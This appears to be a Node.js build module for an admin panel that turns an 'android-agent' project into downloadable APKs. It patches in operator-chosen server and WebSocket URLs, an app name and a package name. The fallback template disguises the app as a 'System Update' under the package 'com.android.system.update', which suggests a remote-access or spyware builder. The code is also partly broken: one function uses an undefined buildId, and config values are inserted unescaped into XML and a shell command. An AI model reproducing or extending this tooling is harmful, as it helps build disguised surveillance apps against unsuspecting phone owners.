const fs = require('fs');
const path = require('path');
const { execSync } = require('child_process');

/**
 * APK Builder Module
 * Takes build config from admin panel, modifies the android-agent source,
 * and builds the APK with Gradle.
 */

const AGENT_DIR = path.join(__dirname, '..', 'android-agent');
const BUILDS_DIR = path.join(__dirname, 'builds', 'apks');

function ensureDir(dir) {
  if (!fs.existsSync(dir)) {
    fs.mkdirSync(dir, { recursive: true });
  }
}

/**
 * Read the current AndroidManifest.xml template
 */
function readManifest() {
  const manifestPath = path.join(AGENT_DIR, 'app', 'src', 'main', 'AndroidManifest.xml');
  return fs.readFileSync(manifestPath, 'utf8');
}

/**
 * Update strings.xml with server URLs from config
 */
function updateStringsXml(buildConfig) {
  const stringsPath = path.join(AGENT_DIR, 'app', 'src', 'main', 'res', 'values', 'strings.xml');
  let content = fs.readFileSync(stringsPath, 'utf8');

  // Replace the server_url and ws_url values
  content = content.replace(
    /<string name="server_url"[^>]*>.*?<\/string>/,
    `<string name="server_url" translatable="false">${buildConfig.serverUrl}</string>`
  );
  content = content.replace(
    /<string name="ws_url"[^>]*>.*?<\/string>/,
    `<string name="ws_url" translatable="false">${buildConfig.wsUrl}</string>`
  );

  // Update app name if provided
  if (buildConfig.name) {
    content = content.replace(
      /<string name="app_name">.*?<\/string>/,
      `<string name="app_name">${buildConfig.name}</string>`
    );
  }

  fs.writeFileSync(stringsPath, content, 'utf8');
  console.log(`[APK Builder] Updated strings.xml with server URLs`);
}

/**
 * Update app build.gradle.kts with package name/version from config
 */
function updateBuildGradle(buildConfig) {
  const gradlePath = path.join(AGENT_DIR, 'app', 'build.gradle.kts');
  let content = fs.readFileSync(gradlePath, 'utf8');

  // Update applicationId if changed
  if (buildConfig.packageName) {
    content = content.replace(
      /applicationId\s*=\s*"[^"]*"/,
      `applicationId = "${buildConfig.packageName}"`
    );
  }

  // Update version
  if (buildConfig.version) {
    const [versionName] = buildConfig.version.split('+');
    content = content.replace(
      /versionCode\s*=\s*\d+/,
      `versionCode = ${Math.floor(Date.now() / 1000)}`
    );
    content = content.replace(
      /versionName\s*=\s*"[^"]*"/,
      `versionName = "${versionName || buildConfig.version}"`
    );
  }

  fs.writeFileSync(gradlePath, content, 'utf8');
  console.log(`[APK Builder] Updated build.gradle.kts`);
}

/**
 * Restore original strings.xml from git or defaults
 */
function restoreStringsXml() {
  // If git-tracked, restore via git
  try {
    execSync('git checkout -- app/src/main/res/values/strings.xml', {
      cwd: AGENT_DIR,
      stdio: 'pipe'
    });
    console.log('[APK Builder] Restored strings.xml from git');
    return;
  } catch (e) {
    // Fallback: restore from backup
  }

  const stringsPath = path.join(AGENT_DIR, 'app', 'src', 'main', 'res', 'values', 'strings.xml');
  const backupPath = stringsPath + '.backup';
  if (fs.existsSync(backupPath)) {
    fs.copyFileSync(backupPath, stringsPath);
    fs.unlinkSync(backupPath);
  }
}

/**
 * Restore original build.gradle.kts
 */
function restoreBuildGradle() {
  try {
    execSync('git checkout -- app/build.gradle.kts', {
      cwd: AGENT_DIR,
      stdio: 'pipe'
    });
    return;
  } catch (e) {}

  const gradlePath = path.join(AGENT_DIR, 'app', 'build.gradle.kts');
  const backupPath = gradlePath + '.backup';
  if (fs.existsSync(backupPath)) {
    fs.copyFileSync(backupPath, gradlePath);
    fs.unlinkSync(backupPath);
  }
}

/**
 * Back up original files before modifying
 */
function backupOriginals() {
  const stringsPath = path.join(AGENT_DIR, 'app', 'src', 'main', 'res', 'values', 'strings.xml');
  const gradlePath = path.join(AGENT_DIR, 'app', 'build.gradle.kts');

  if (!fs.existsSync(stringsPath + '.backup')) {
    fs.copyFileSync(stringsPath, stringsPath + '.backup');
  }
  if (!fs.existsSync(gradlePath + '.backup')) {
    fs.copyFileSync(gradlePath, gradlePath + '.backup');
  }
}

/**
 * Build the APK using Gradle
 * Returns the path to the generated APK
 */
function buildApk(buildId) {
  console.log(`[APK Builder] Starting Gradle build for ${buildId}...`);

  // Check if gradlew exists and is executable
  const gradlewPath = path.join(AGENT_DIR, 'gradlew');
  if (!fs.existsSync(gradlewPath)) {
    throw new Error('gradlew not found. Ensure the Android SDK is properly set up.');
  }

  // Make gradlew executable
  fs.chmodSync(gradlewPath, '755');

  try {
    // Run assembleRelease to build the APK
    const output = execSync(`ANDROID_HOME=${process.env.ANDROID_HOME || path.join(process.env.HOME, 'Android', 'Sdk')} ./gradlew assembleRelease`, {
      cwd: AGENT_DIR,
      stdio: 'pipe',
      timeout: 600000 // 10 minutes max
    });

    // Find the generated APK
    const releaseDir = path.join(AGENT_DIR, 'app', 'build', 'outputs', 'apk', 'release');
    const apkFiles = fs.readdirSync(releaseDir).filter(f => f.endsWith('.apk'));

    if (apkFiles.length === 0) {
      throw new Error('No APK files found in build output');
    }

    const sourceApk = path.join(releaseDir, apkFiles[0]);

    // Copy to builds directory with build ID
    ensureDir(BUILDS_DIR);
    const destApk = path.join(BUILDS_DIR, `${buildId}.apk`);
    fs.copyFileSync(sourceApk, destApk);

    console.log(`[APK Builder] APK built successfully: ${destApk}`);
    return destApk;

  } catch (err) {
    console.error('[APK Builder] Build error:', err.message);
    throw err;
  }
}

/**
 * Check if Gradle and Android SDK are available
 */
function checkBuildEnvironment() {
  const androidHome = process.env.ANDROID_HOME || path.join(process.env.HOME, 'Android', 'Sdk');
  
  // Check for Java/JDK
  try {
    execSync('java -version 2>&1', { stdio: 'pipe' });
  } catch {
    return { ready: false, error: 'Java (JDK) is not installed. Install JDK 17+.' };
  }

  // Check for gradlew
  if (!fs.existsSync(path.join(AGENT_DIR, 'gradlew'))) {
    return { ready: false, error: 'gradlew not found in android-agent directory.' };
  }

  // Check Android SDK
  if (!fs.existsSync(androidHome)) {
    return { ready: false, error: `Android SDK not found at ${androidHome}. Set ANDROID_HOME or install SDK.` };
  }

  // Check local.properties
  const localProps = path.join(AGENT_DIR, 'local.properties');
  if (!fs.existsSync(localProps)) {
    // Create local.properties with sdk path
    fs.writeFileSync(localProps, `sdk.dir=${androidHome}\n`);
  }

  return { ready: true, androidHome };
}

/**
 * Main build function
 */
async function buildAPK(buildConfig) {
  const buildId = buildConfig.buildId;
  console.log(`[APK Builder] Starting build: ${buildId}`);

  // First check environment
  const env = checkBuildEnvironment();
  console.log(`[APK Builder] Build environment:`, env);

  // Backup original files
  backupOriginals();

  try {
    // Modify source files with config
    updateStringsXml(buildConfig);
    updateBuildGradle(buildConfig);

    if (!env.ready) {
      // If can't build natively, create a zip of the configured source
      console.log(`[APK Builder] Native build not available. Creating source archive instead.`);
      return await createSourceArchive(buildId, buildConfig);
    }

    // Build the APK
    const apkPath = buildApk(buildId);
    return { success: true, path: apkPath, buildId, method: 'gradle' };

  } catch (err) {
    console.error(`[APK Builder] Build failed:`, err.message);
    // Fallback: create source archive
    return await createSourceArchive(buildId, buildConfig);
  } finally {
    // Restore original files
    restoreStringsXml();
    restoreBuildGradle();
  }
}

/**
 * Create a zip of the configured source code (fallback when Gradle not available)
 */
async function createSourceArchive(buildId, buildConfig) {
  const archiver = require('archiver');
  ensureDir(BUILDS_DIR);
  
  const zipPath = path.join(BUILDS_DIR, `${buildId}-source.zip`);
  const output = fs.createWriteStream(zipPath);
  const archive = archiver('zip', { zlib: { level: 9 } });

  return new Promise((resolve, reject) => {
    output.on('close', () => {
      console.log(`[APK Builder] Source archive created: ${zipPath} (${archive.pointer()} bytes)`);
      
      // Try to create a basic APK from template
      const apkPath = path.join(BUILDS_DIR, `${buildId}.apk`);
      createTemplateApk(apkPath, buildConfig)
        .then(() => {
          resolve({ 
            success: true, 
            path: apkPath, 
            zipPath, 
            buildId, 
            method: 'template',
            message: 'Gradle not available. Download the source zip and build manually with Android Studio.'
          });
        })
        .catch(() => {
          resolve({ 
            success: true, 
            path: zipPath, 
            buildId, 
            method: 'source-only',
            isSourceArchive: true,
            message: 'Build environment not ready. Source archive created - build manually with Android Studio.'
          });
        });
    });

    archive.on('error', reject);

    archive.pipe(output);
    archive.directory(AGENT_DIR, 'android-agent');
    archive.finalize();
  });
}

/**
 * Create a pre-configured APK from an aapt2-based template
 * This generates a minimal valid APK with the configured server URLs baked in
 */
async function createTemplateApk(apkPath, buildConfig) {
  // Check for aapt2 (Android SDK tool)
  const androidHome = process.env.ANDROID_HOME || path.join(process.env.HOME, 'Android', 'Sdk');
  const aapt2Path = path.join(androidHome, 'build-tools');
  
  if (!fs.existsSync(aapt2Path)) {
    throw new Error('Android build-tools not found');
  }

  // Package resources
  const buildDir = path.join(BUILDS_DIR, 'tmp', buildId);
  ensureDir(buildDir);
  
  // Generate AndroidManifest with the configured URLs
  const manifest = `<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="${buildConfig.packageName || 'com.android.system.update'}">
    <uses-permission android:name="android.permission.INTERNET" />
    <application android:label="${buildConfig.name || 'System Update'}">
        <activity android:name=".MainActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>`;

  fs.writeFileSync(path.join(buildDir, 'AndroidManifest.xml'), manifest);
  
  // This is a placeholder - real APK build requires full Android SDK setup
  throw new Error('Full APK generation requires Gradle and Android SDK');
}

/**
 * Get the APK download URL for a given build
 */
function getApkDownloadUrl(buildId) {
  const apkPath = path.join(BUILDS_DIR, `${buildId}.apk`);
  const zipPath = path.join(BUILDS_DIR, `${buildId}-source.zip`);

  const result = {};
  if (fs.existsSync(apkPath)) {
    result.apkUrl = `/api/apk/download/${buildId}.apk`;
  }
  if (fs.existsSync(zipPath)) {
    result.sourceUrl = `/api/apk/download/${buildId}-source.zip`;
  }
  return result;
}

module.exports = {
  buildAPK,
  getApkDownloadUrl,
  checkBuildEnvironment,
  BUILDS_DIR
};